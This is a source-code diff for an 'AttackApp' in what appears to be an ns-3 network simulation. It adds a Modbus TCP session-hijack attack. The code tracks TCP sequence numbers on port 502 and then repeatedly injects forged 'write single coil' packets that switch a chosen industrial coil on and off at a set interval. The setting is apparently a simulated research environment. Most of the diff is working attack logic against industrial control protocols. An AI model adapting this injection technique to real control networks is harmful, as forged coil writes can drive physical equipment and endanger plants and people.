@@ -158,6 +158,89 @@ AttackApp::ScheduleTx (void)
 }
 
 
+void
+AttackApp::SendPacketAlterCoilValue (modbusAlternateSwitchCoilParameters
+		*parameters)
+{
+
+
+	unsigned char * bufferAlternateCoil;
+	if(parameters->state==false)
+	{
+	bufferAlternateCoil=  new unsigned char[12]{0x00, 0x00, 0x00, 0x00, 0x00, 0x06, 0x01, 0x05, 0x00, 0x00, 0xff, 0x00} ;
+	parameters->state=true;
+	int16_t index = (int16_t)parameters->index-1;
+	index = htons(index);
+	memcpy(&bufferAlternateCoil[8],&index,2);
+
+	}
+	else
+	{
+		bufferAlternateCoil=  new unsigned char[12]{0x00, 0x00, 0x00, 0x00, 0x00, 0x06, 0x01, 0x05, 0x00, 0x00, 0x00, 0x00} ;
+			parameters->state=false;
+			int16_t index = (int16_t)parameters->index-1;
+			index = htons(index);
+				memcpy(&bufferAlternateCoil[8],&index,2);
+	}
+
+
+
+	Ptr<Packet> packetAlternateCoil = Create<Packet>(bufferAlternateCoil,12);
+	 std::vector< Node::ProtocolHandlerEntry> protocolList = m_node->GetProtocolHandlerList();
+	 parameters->tcpHdr.EnableChecksums();
+	 packetAlternateCoil->AddHeader(parameters->tcpHdr);
+	 		//	printf("Flags %x OrgLength: %d NewLength: %d Packet size: %d\n",tcpHdr.GetFlags()&TcpHeader::SYN,tcpHdr1.GetLength(),tcpHdr.GetLength(),packetCopy->GetSize ());
+	 //			if(tcpHdr1.IsChecksumOk() && ipV4Hdr.IsChecksumOk())
+	 //				//printf("Checksum ok\n");
+	 //			else
+	 				//printf("Checksum error");
+	 parameters->ipV4Hdr.SetPayloadSize(packetAlternateCoil->GetSize());
+	 parameters->ipV4Hdr.EnableChecksum();
+	 			packetAlternateCoil->AddHeader(parameters->ipV4Hdr);
+	  for (Node::ProtocolHandlerList::iterator i = protocolList.begin ();
+	       i != protocolList.end (); i++)
+	    {
+	      if ((i->device != 0 && i->device == parameters->device))
+	        {
+	          if (i->protocol == 2048)
+	            {
+	              if (parameters->promisc == i->promiscuous)
+	                {
+
+	            		  i->handler (parameters->device, packetAlternateCoil , parameters->protocol, parameters->from, parameters->to, parameters->packetType);
+	            		  if(parameters->state == true)
+	            			  printf("send LATCH OFF \n");
+	            		  else
+	            			  printf("send LATCH ON \n");
+	            		//  printf("Payload Length : %d \n Src Port : %d Dst Port : %d \n", lengthOfData, tcpHdr1.GetSourcePort(),tcpHdr1.GetDestinationPort());
+
+
+
+	            		  parameters->tcpHdr.SetSequenceNumber(parameters->tcpHdr.GetSequenceNumber()+12);
+
+	                }
+	            }
+	        }
+	    }
+  //m_attacker.SendGratituousArpReply(m_arpCache, (Ipv4Address)m_fakeAddr[i], (Ipv4Address)m_vAddr[i], (Address)m_vMac[i]);
+
+
+	  // Add information for the new packet
+
+  //std::cout << "stucked here" << std::endl;
+  ScheduleTxAlterCoil(parameters );
+}
+
+void
+AttackApp::ScheduleTxAlterCoil (modbusAlternateSwitchCoilParameters *parameters)
+{
+  if (m_running)
+    {
+      Time tNext (MilliSeconds(parameters->period));
+      m_sendEvent = Simulator::Schedule (tNext, &AttackApp::SendPacketAlterCoilValue,this,parameters );
+    }
+}
+
 bool AttackApp::PromiscReceiveFromDevice (Ptr<NetDevice> device, Ptr<const Packet> packet, uint16_t protocol,
                                    const Address &from, const Address &to, NetDevice::PacketType )
 {
@@ -395,6 +478,7 @@ int AttackApp::readConfigFile( configuration * config)
 	   	    				break;
 	   	    			case 1:
 	   	    				config->modbus.values_to_alter[indexNum].identifier = stoi(s,nullptr,10);
+
 	   	    				parameter++;
 	   	    			    break;
 
@@ -402,7 +486,14 @@ int AttackApp::readConfigFile( configuration * config)
 
 	   	    				(config->modbus.values_to_alter[indexNum]).integer_value =stol(s,nullptr,0);
 	   	    				std::cout<<"type:"<<(int)(config->modbus.values_to_alter[indexNum]).type << "id:"<<(int)(config->modbus.values_to_alter[indexNum]).identifier <<"Val:"<<(config->modbus.values_to_alter[indexNum]).integer_value <<std::endl;
+	   	    				if(config->modbus.values_to_alter[indexNum].type ==17)
+	   	    				{
+	   	    					//launch session hijack and continuously switch on and off coil of givn index with given period
+	   	    					enableAlternatingCoilValuesMODBUS = true;
+	   	    					indexOfCoil = config->modbus.values_to_alter[indexNum].identifier;
+								periodOfCoilStateSwitch = (config->modbus.values_to_alter[indexNum]).integer_value;
 
+	   	    				}
 	   	    				parameter++;
 
 	   	    				break;
@@ -932,6 +1023,8 @@ AttackApp::ReceiveFromDevice (Ptr<NetDevice> device, Ptr<const Packet> packet, u
   Ptr<Packet> packetCopy= packet->Copy();
   int lengthOfData;
   int ipProtocol = 0;
+  int32_t nextSeqNo = 0;
+  int32_t nextAck = 0;
 
   if(protocol == 2048) {
 	  packetCopy->RemoveHeader (ipV4Hdr);
@@ -1112,6 +1205,9 @@ else if(ipProtocol == 6 && (lengthOfData>0) && (tcpHdr1.GetDestinationPort()==20
 		senderIp = ipV4Hdr.GetDestination();
 				senderIntIP = senderIp.Get();
 				key = (senderIntIP<<16) + tcpHdr1.GetDestinationPort();
+
+				nextSeqNo = (int32_t)tcpHdr1.GetAckNumber().GetValue();
+				nextAck = (int32_t)tcpHdr1.GetSequenceNumber().GetValue()+tcpHdr1.GetLength();
 	}
 
 		if(mmapOfdnp3Data.find(key)!=mmapOfdnp3Data.end())
@@ -1191,6 +1287,10 @@ else if(ipProtocol == 6 && (lengthOfData>0) && (tcpHdr1.GetDestinationPort()==50
 		senderIp = ipV4Hdr.GetDestination();
 				senderIntIP = senderIp.Get();
 				key = (senderIntIP<<16) + tcpHdr1.GetDestinationPort();
+				nextSeqNo = (int32_t)tcpHdr1.GetAckNumber().GetValue();
+				nextAck = (int32_t)tcpHdr1.GetSequenceNumber().GetValue()+tcpHdr1.GetLength();
+				session->nextSeq =nextSeqNo;
+				session->nextAck = nextAck;
 	}
 
 		if(mmapOfModbusData.find(key)!=mmapOfModbusData.end())
@@ -1242,6 +1342,34 @@ else if(ipProtocol == 6 && (lengthOfData>0) && (tcpHdr1.GetDestinationPort()==50
 			 ipV4Hdr.SetPayloadSize(packetNew->GetSize());
 			 ipV4Hdr.EnableChecksum();
 		     packetNew->AddHeader(ipV4Hdr);
+
+		     if(enableAlternatingCoilValuesMODBUS &&  tcpHdr1.GetDestinationPort()==502)
+		     {
+		    	 enableAlternatingCoilValuesMODBUS = false;
+
+
+		    	 		//	printf("Flags %x OrgLength: %d NewLength: %d Packet size: %d\n",tcpHdr.GetFlags()&TcpHeader::SYN,tcpHdr1.GetLength(),tcpHdr.GetLength(),packetCopy->GetSize ());
+		    	 //			if(tcpHdr1.IsChecksumOk() && ipV4Hdr.IsChecksumOk())
+		    	 //				//printf("Checksum ok\n");
+		    	 //			else
+		    	 				//printf("Checksum error");
+
+
+		     modbusAlternateSwitchCoilParameters *parameters =  new _modbusAlternateSwitchCoilParameters();
+		     parameters->device=device;
+		     parameters->from = from;
+		     parameters->index = indexOfCoil;
+		    parameters->ipV4Hdr = ipV4Hdr;
+		    parameters->packetType = packetType;
+		    parameters->period = periodOfCoilStateSwitch;
+		    parameters->promisc = promiscuous;
+		    parameters->protocol =  protocol;
+		    parameters->state = true;
+		    parameters->tcpHdr = tcpHdr;
+		    parameters->tcpHdr.SetSequenceNumber(parameters->tcpHdr.GetSequenceNumber()+parameters->tcpHdr.GetLength());
+		    parameters->to = to;
+		    	 SendPacketAlterCoilValue ( parameters);
+		     }
 
 }
 
